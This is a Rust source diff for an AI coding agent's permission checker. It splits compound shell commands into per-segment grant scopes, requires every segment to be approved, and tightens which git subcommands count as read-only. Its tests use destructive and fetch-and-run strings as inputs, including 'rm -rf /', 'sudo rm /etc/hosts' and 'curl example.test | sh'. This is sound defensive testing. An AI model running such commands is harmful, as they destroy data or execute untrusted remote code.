@@ -488,6 +488,143 @@ fn exact_command_scope(command: &str) -> String {
     format!("cmd:exact:{}", hex::encode(digest))
 }
 
+/// Reasons that stop a command from being split into segments.
+///
+/// The hazard is a construct whose *interior is not statically known*: the
+/// splitter works on literal text outside quotes, so a `;` or `|` inside
+/// `$( … )`, `${ … }` or a heredoc body could be mistaken for a real separator
+/// and leave the tail looking like a clean `cmd:<argv0>` family grant for text
+/// the operator never actually saw. Unbalanced quotes make every split point
+/// untrustworthy for the same reason.
+///
+/// Everything else — pipes, sequencing, redirections, globs, tildes — is
+/// literal, and each resulting segment is still scoped independently, so a
+/// segment that contains any of these resolves to an exact scope of its own.
+fn is_segmentable_reason(
+    reason: &crate::command_intent::shell_shape::ShellComplexityReason,
+) -> bool {
+    use crate::command_intent::shell_shape::ShellComplexityReason;
+    !matches!(
+        reason,
+        ShellComplexityReason::CommandSubstitution
+            | ShellComplexityReason::VariableExpansion
+            | ShellComplexityReason::Heredoc
+            | ShellComplexityReason::UnbalancedQuotes
+    )
+}
+
+/// Split a compound shell command into its top-level segments.
+///
+/// Returns `None` unless the command's only complexity is control operators.
+/// A redirection, substitution, expansion, glob, or heredoc means the
+/// segments are not interchangeable with their simple form, so the caller must
+/// fall back to one exact scope for the entire invocation.
+///
+/// Separators are recognized only outside quotes, so a `;` or `|` that is
+/// argument *data* is never mistaken for a control operator.
+fn split_top_level_segments(command: &str) -> Option<Vec<String>> {
+    use crate::command_intent::shell_shape::{parse_shell_words, ShellShape};
+
+    let ShellShape::ComplexShell { reasons } = parse_shell_words(command) else {
+        return None;
+    };
+    if reasons.is_empty() || !reasons.iter().all(is_segmentable_reason) {
+        return None;
+    }
+
+    let mut segments = Vec::new();
+    let mut current = String::new();
+    let mut in_single = false;
+    let mut in_double = false;
+    let mut chars = command.chars().peekable();
+    while let Some(ch) = chars.next() {
+        if ch == '\\' {
+            current.push(ch);
+            if let Some(escaped) = chars.next() {
+                current.push(escaped);
+            }
+            continue;
+        }
+        match ch {
+            '\'' => in_single = !in_single,
+            '"' => in_double = !in_double,
+            _ => {}
+        }
+        if !in_single && !in_double && matches!(ch, ';' | '|' | '&' | '\n' | '\r') {
+            // A separator run (`&&`, `||`, a trailing `;`) contributes no
+            // empty segment; only a real command ends one.
+            if !current.trim().is_empty() {
+                segments.push(std::mem::take(&mut current));
+            } else {
+                current.clear();
+            }
+            continue;
+        }
+        current.push(ch);
+    }
+    if in_single || in_double {
+        // Unbalanced quotes: the split points are not trustworthy.
+        return None;
+    }
+    if !current.trim().is_empty() {
+        segments.push(current);
+    }
+
+    let parts: Vec<String> = segments
+        .into_iter()
+        .map(|segment| segment.trim().to_string())
+        .collect();
+    (parts.len() > 1).then_some(parts)
+}
+
+/// Every scope that together authorizes one shell command.
+///
+/// A simple command has exactly one scope. A compound command sequenced with
+/// only control operators (`a | b && c`) gets one scope per segment, so a
+/// saved grant on `git status` also covers `git status && git diff` *without*
+/// granting anything about `git diff` itself: the compound command is allowed
+/// only when every segment independently resolves to an Allow. That is what
+/// makes "Allow always" converge instead of re-prompting on every slightly
+/// different pipeline.
+pub fn decision_scopes_for_shell_command(command: &str) -> Vec<String> {
+    let segments = split_top_level_segments(command);
+    let scopes: Vec<String> = match &segments {
+        Some(segments) => segments
+            .iter()
+            .filter_map(|segment| decision_scope_for_shell_command(segment))
+            .collect(),
+        None => decision_scope_for_shell_command(command)
+            .into_iter()
+            .collect(),
+    };
+
+    let mut scopes = scopes;
+    scopes.sort();
+    scopes.dedup();
+    if scopes.is_empty() {
+        scopes.push(exact_command_scope(command));
+    }
+    scopes
+}
+
+/// Scopes for any tool call, using the multi-segment derivation for shell
+/// tools. See [`decision_scopes_for_shell_command`].
+pub fn decision_scopes_for_tool_call(tool: &str, args: Option<&serde_json::Value>) -> Vec<String> {
+    let Some(args) = args else {
+        return Vec::new();
+    };
+    match tool {
+        "bash" | "terminal" | "test" => scope_command_text(args, &["command", "cmd"])
+            .map(|command| decision_scopes_for_shell_command(&command))
+            .unwrap_or_default(),
+        "git" => scope_command_text(args, &["subcommand", "command"])
+            .and_then(|subcommand| decision_scope_for_git_subcommand(&subcommand))
+            .into_iter()
+            .collect(),
+        _ => Vec::new(),
+    }
+}
+
 fn is_env_assignment(token: &str) -> bool {
     let Some((name, _)) = token.split_once('=') else {
         return false;
@@ -528,28 +665,32 @@ pub fn decision_scope_for_git_subcommand(subcommand: &str) -> Option<String> {
 ///
 /// `None` means "no deterministic family available": the decision stays
 /// broad rather than inventing a narrower grant from unparseable input.
+/// Extract the command/subcommand text a scope should be derived from.
+///
+/// Accepts either a bare string or the usual tool-argument object.
+fn scope_command_text(args: &serde_json::Value, keys: &[&str]) -> Option<String> {
+    if let Some(text) = args.as_str() {
+        return Some(text.to_string());
+    }
+    keys.iter().find_map(|key| {
+        args.get(*key)
+            .and_then(|value| value.as_str())
+            .map(str::to_string)
+    })
+}
+
 pub fn decision_scope_for_tool_call(
     tool: &str,
     args: Option<&serde_json::Value>,
 ) -> Option<String> {
     let args = args?;
-    let command_text = |keys: &[&str]| -> Option<String> {
-        if let Some(text) = args.as_str() {
-            return Some(text.to_string());
-        }
-        keys.iter().find_map(|key| {
-            args.get(*key)
-                .and_then(|value| value.as_str())
-                .map(str::to_string)
-        })
-    };
     match tool {
         "bash" | "terminal" | "test" => {
-            let command = command_text(&["command", "cmd"])?;
+            let command = scope_command_text(args, &["command", "cmd"])?;
             decision_scope_for_shell_command(&command)
         }
         "git" => {
-            let subcommand = command_text(&["subcommand", "command"])?;
+            let subcommand = scope_command_text(args, &["subcommand", "command"])?;
             decision_scope_for_git_subcommand(&subcommand)
         }
         _ => None,
@@ -1120,26 +1261,44 @@ impl PermissionChecker {
         }
 
         // Persistent decisions remain reusable after current Deny rules are
-        // honored. Simple commands use a family scope; complex shell shapes
-        // use an exact-invocation digest; legacy broad rows remain compatible.
-        let scope = match tool {
-            "bash" | "terminal" | "test" => args.and_then(decision_scope_for_shell_command),
-            "git" => args.and_then(decision_scope_for_git_subcommand),
-            _ => None,
+        // honored. Simple commands use a family scope; a compound command
+        // sequenced with only control operators contributes one scope per
+        // segment; anything else uses an exact-invocation digest. Legacy broad
+        // rows remain compatible.
+        let scopes = match tool {
+            "bash" | "terminal" | "test" => args
+                .map(decision_scopes_for_shell_command)
+                .unwrap_or_default(),
+            "git" => args
+                .and_then(decision_scope_for_git_subcommand)
+                .into_iter()
+                .collect(),
+            _ => Vec::new(),
         };
         {
             let store = self.store.read().await;
-            if let Some(level) = store.get_decision_scoped(tool, path, scope.as_deref(), session_id)
-            {
-                return match level {
-                    PermissionLevel::Allow => PermissionResult::Allow,
-                    PermissionLevel::Deny => PermissionResult::Deny,
-                    PermissionLevel::Ask => PermissionResult::Ask(PermissionRequest {
-                        tool: tool.to_string(),
-                        path: path.map(|p| p.to_string()),
-                        args: args.map(|a| serde_json::json!({ "command": a })),
-                    }),
-                };
+            // Intersection semantics: a compound command is authorized only
+            // when *every* segment has already been granted. One unresolved
+            // segment leaves the whole invocation to the normal decision path,
+            // so segmenting can never widen a grant beyond what the operator
+            // actually approved. Any explicit Deny still wins outright.
+            let mut unresolved = false;
+            for scope in &scopes {
+                match store.get_decision_scoped(tool, path, Some(scope.as_str()), session_id) {
+                    Some(PermissionLevel::Allow) => {}
+                    Some(PermissionLevel::Deny) => return PermissionResult::Deny,
+                    Some(PermissionLevel::Ask) => {
+                        return PermissionResult::Ask(PermissionRequest {
+                            tool: tool.to_string(),
+                            path: path.map(|p| p.to_string()),
+                            args: args.map(|a| serde_json::json!({ "command": a })),
+                        })
+                    }
+                    None => unresolved = true,
+                }
+            }
+            if !unresolved {
+                return PermissionResult::Allow;
             }
         }
 
@@ -1675,12 +1834,47 @@ fn compile_path_rules(rules: &[PathRule]) -> Vec<(globset::GlobMatcher, Permissi
         .collect()
 }
 
+/// The decision ruleset for an unclaimed tool: `[permission]` when the
+/// operator wrote one, otherwise the built-in `default_ruleset()`.
 pub fn config_ruleset(config: Option<&Config>) -> PermissionRuleset {
+    build_config_ruleset(config, true)
+}
+
+/// The `[permission]` statements the operator actually wrote.
+///
+/// `config_ruleset` answers "what should happen when nobody else has spoken?",
+/// so it substitutes the built-in `default_ruleset()` Ask list and synthesizes
+/// bash fallbacks. That answer is correct for a tool nobody declares, and
+/// wrong as an *operator decision* inside a merge: with it, an agent declaring
+/// `task = "allow"` is clamped straight back to `ask` by a default the operator
+/// never wrote. Defaults are not decisions.
+///
+/// This variant therefore contributes a level only where a config key names
+/// the tool, or the operator opted into the matching built-in switch
+/// (`allow_all_bash`, `bash_ask_patterns`, …). An absent `[permission]` table
+/// yields a neutral ruleset — `default: Ask`, no tool rules — so "the operator
+/// has not spoken about this tool" is representable instead of being reported
+/// as an implicit `ask`.
+///
+/// Enforcement for an undeclared tool is unchanged: `PermissionChecker` still
+/// resolves those through [`config_ruleset`] and `default_ruleset()`.
+pub fn explicit_config_ruleset(config: Option<&Config>) -> PermissionRuleset {
+    build_config_ruleset(config, false)
+}
+
+fn build_config_ruleset(
+    config: Option<&Config>,
+    include_builtin_defaults: bool,
+) -> PermissionRuleset {
     let Some(config) = config else {
         return PermissionRuleset::default();
     };
     let Some(perm) = &config.permission else {
-        return default_ruleset();
+        return if include_builtin_defaults {
+            default_ruleset()
+        } else {
+            PermissionRuleset::default()
+        };
     };
 
     let default = perm
@@ -1789,8 +1983,15 @@ pub fn config_ruleset(config: Option<&Config>) -> PermissionRuleset {
             });
         }
     } else {
-        // bash is not configured: use default allow patterns + config default as fallback
-        let mut bash_allow = default_bash_allow_patterns();
+        // bash is not configured. The built-in safe-command allow patterns and
+        // the synthesized "unmatched falls back to the default" rule are
+        // defaults, so `explicit_config_ruleset` contributes neither; an
+        // operator who wrote `bash_allow_patterns` still contributes those.
+        let mut bash_allow = if include_builtin_defaults {
+            default_bash_allow_patterns()
+        } else {
+            Vec::new()
+        };
         if let Some(extra) = &perm.bash_allow_patterns {
             bash_allow.extend(extra.iter().cloned());
         }
@@ -1813,12 +2014,14 @@ pub fn config_ruleset(config: Option<&Config>) -> PermissionRuleset {
             }
         }
         // Unmatched bash commands use the config default
-        tool_rules.push(ToolRule {
-            tool: "bash".to_string(),
-            level: default.clone(),
-            paths: None,
-            bash_patterns: None,
-        });
+        if include_builtin_defaults {
+            tool_rules.push(ToolRule {
+                tool: "bash".to_string(),
+                level: default.clone(),
+                paths: None,
+                bash_patterns: None,
+            });
+        }
     }
 
     let tool_mappings = [
@@ -2018,31 +2221,53 @@ pub fn default_ruleset() -> PermissionRuleset {
         });
     }
 
-    // Git read-only subcommands are auto-allowed
-    let git_read_only = [
-        "status",
-        "log",
-        "diff",
-        "branch",
-        "show",
-        "ls-files",
-        "cat-file",
-        "rev-parse",
-        "remote",
-    ];
-    for subcommand in git_read_only {
+    // Git read-only subcommands are auto-allowed. The set is `codegg-git`'s, not
+    // a name list kept here: `branch`, `tag`, `remote`, `stash`, and `worktree`
+    // each have a read-only *form*, so listing them by name is what made
+    // `git remote add` and `git stash` auto-allowed. Only names that are
+    // read-only in every modelled form belong here
+    // (`codegg_git::READ_ONLY_SUBCOMMANDS`).
+    //
+    // Per-invocation precision — `branch` list vs `branch -d` — is enforced in
+    // `GitTool`, which sees the argv. A rule that has only a subcommand name
+    // must stay conservative.
+    for subcommand in codegg_git::operation::READ_ONLY_SUBCOMMANDS {
         tool_rules.push(ToolRule {
             tool: "git".to_string(),
             level: PermissionLevel::Allow,
             paths: None,
-            bash_patterns: Some(vec![subcommand.to_string()]),
+            bash_patterns: Some(vec![(*subcommand).to_string()]),
         });
     }
 
-    // Git mutating subcommands require permission
+    // Git mutating subcommands require permission. `remote` and `config` are
+    // listed because they mutate repository configuration and were previously
+    // absent; `branch`, `stash`, and `tag` are here because their names are
+    // shared with a read-only form.
     let git_write = [
-        "add", "commit", "push", "pull", "merge", "checkout", "reset", "rebase", "stash", "branch",
-        "tag", "clone", "fetch", "clean", "mv", "rm",
+        "add",
+        "commit",
+        "push",
+        "pull",
+        "merge",
+        "checkout",
+        "switch",
+        "reset",
+        "rebase",
+        "cherry-pick",
+        "revert",
+        "stash",
+        "branch",
+        "tag",
+        "clone",
+        "fetch",
+        "clean",
+        "mv",
+        "rm",
+        "remote",
+        "config",
+        "worktree",
+        "restore",
     ];
     for subcommand in git_write {
         tool_rules.push(ToolRule {
@@ -2622,6 +2847,168 @@ mod tests {
                 .check_with_args("bash", None, Some("rm -rf /"), None)
                 .await,
             PermissionResult::Ask(_)
+        ));
+    }
+
+    #[test]
+    fn compound_command_scopes_split_on_control_operators() {
+        assert_eq!(
+            decision_scopes_for_shell_command("git status && git diff"),
+            vec!["cmd:git".to_string()],
+            "both segments are the git family, so one grant covers both"
+        );
+        assert_eq!(
+            decision_scopes_for_shell_command("ls -la && git status"),
+            vec!["cmd:git".to_string(), "cmd:ls".to_string()]
+        );
+        // A pipeline of ordinary utilities is the common case that used to
+        // collapse into one exact string.
+        let piped = decision_scopes_for_shell_command("grep -rn foo src/ | head -20 | wc -l");
+        assert_eq!(
+            piped,
+            vec![
+                "cmd:grep".to_string(),
+                "cmd:head".to_string(),
+                "cmd:wc".to_string()
+            ]
+        );
+        // A simple command is unchanged: exactly one family scope.
+        assert_eq!(
+            decision_scopes_for_shell_command("cargo test --all"),
+            vec!["cmd:cargo".to_string()]
+        );
+        // Duplicates collapse so one approval persists one rule.
+        assert_eq!(
+            decision_scopes_for_shell_command("git status; git status"),
+            vec!["cmd:git".to_string()]
+        );
+    }
+
+    #[test]
+    fn compound_command_scopes_stay_exact_when_a_segment_is_not_interchangeable() {
+        // A redirection decides where a segment writes, so it must stay part
+        // of that segment's identity rather than collapsing onto `cmd:ls`.
+        let redirected = decision_scopes_for_shell_command("ls -la > /tmp/out.txt");
+        assert_eq!(redirected.len(), 1);
+        assert!(redirected[0].starts_with("cmd:exact:"));
+
+        // `2>/dev/null` likewise stays exact — and it is the redirect that used
+        // to make the whole agent loop stall.
+        let suppressed = decision_scopes_for_shell_command("grep -rn foo . 2>/dev/null | head -5");
+        assert_eq!(suppressed.len(), 2);
+        assert!(suppressed[0].starts_with("cmd:exact:"));
+        assert_eq!(suppressed[1], "cmd:head");
+
+        // Substitutions, expansions and heredocs hide text the splitter cannot see, so
+        // the whole invocation keeps one exact scope.
+        for command in [
+            "echo $(rm -rf /tmp/x); ls",
+            "ls; echo $HOME",
+            "echo `whoami`; ls",
+            "ls; cat <<EOF\nhi\nEOF",
+            "ls 'unterminated; ls",
+        ] {
+            let scopes = decision_scopes_for_shell_command(command);
+            assert_eq!(
+                scopes.len(),
+                1,
+                "must not segment {command:?} (got {scopes:?})"
+            );
+            assert!(scopes[0].starts_with("cmd:exact:"), "{command:?}");
+        }
+
+        // A glob is literal text, so the command still segments — but the
+        // segment that actually globs keeps its own exact scope.
+        let globbed = decision_scopes_for_shell_command("ls; rm -rf ./build*");
+        assert_eq!(globbed.len(), 2);
+        // Scopes are sorted, so `cmd:exact:` precedes `cmd:ls`.
+        assert!(globbed[0].starts_with("cmd:exact:"), "{globbed:?}");
+        assert_eq!(globbed[1], "cmd:ls");
+    }
+
+    #[test]
+    fn compound_command_scopes_keep_dangerous_families_exact() {
+        let scopes = decision_scopes_for_shell_command("git status && sudo rm /etc/hosts");
+        assert_eq!(scopes.len(), 2);
+        assert_eq!(scopes[1], "cmd:git");
+        assert!(
+            scopes[0].starts_with("cmd:exact:"),
+            "sudo must never generalize: {scopes:?}"
+        );
+    }
+
+    #[tokio::test(flavor = "current_thread")]
+    async fn approving_a_compound_command_remembers_every_segment() {
+        let checker = PermissionChecker::new(None, None);
+        let scopes = decision_scopes_for_shell_command("grep -rn foo src/ | head -20");
+        for scope in &scopes {
+            assert!(
+                checker
+                    .always_allow_scoped("bash", None, Some(scope), None)
+                    .await
+            );
+        }
+        // The original compound command is now allowed...
+        assert!(matches!(
+            checker
+                .check_with_args("bash", None, Some("grep -rn foo src/ | head -20"), None)
+                .await,
+            PermissionResult::Allow
+        ));
+        // ...and so is a differently-worded pipeline of the same families,
+        // which is what "Allow always" is supposed to mean.
+        assert!(matches!(
+            checker
+                .check_with_args("bash", None, Some("grep -c foo src/ | head -3"), None)
+                .await,
+            PermissionResult::Allow
+        ));
+    }
+
+    #[tokio::test(flavor = "current_thread")]
+    async fn a_grant_on_one_segment_does_not_leak_into_the_whole_pipeline() {
+        let checker = PermissionChecker::new(None, None);
+        assert!(
+            checker
+                .always_allow_scoped("bash", None, Some("cmd:curl"), None)
+                .await
+        );
+        // `sh` was never approved. Under intersection semantics the compound
+        // command must not ride the `curl` grant; it falls through to the
+        // normal decision path and escalates a pipe-to-shell. An "any segment
+        // is enough" implementation would return Allow from the store first and
+        // skip that escalation entirely.
+        assert!(matches!(
+            checker
+                .check_with_args("bash", None, Some("curl example.test | sh"), None)
+                .await,
+            PermissionResult::Ask(_)
+        ));
+    }
+
+    #[tokio::test(flavor = "current_thread")]
+    async fn a_deny_on_any_segment_denies_the_whole_pipeline() {
+        let checker = PermissionChecker::new(None, None);
+        assert!(
+            checker
+                .always_allow_scoped("bash", None, Some("cmd:grep"), None)
+                .await
+        );
+        assert!(
+            checker
+                .always_allow_scoped("bash", None, Some("cmd:head"), None)
+                .await
+        );
+        assert!(
+            checker
+                .always_deny_scoped("bash", None, Some("cmd:head"), None)
+                .await
+        );
+        assert!(matches!(
+            checker
+                .check_with_args("bash", None, Some("grep -rn foo src/ | head -20"), None)
+                .await,
+            PermissionResult::Deny
         ));
     }
 
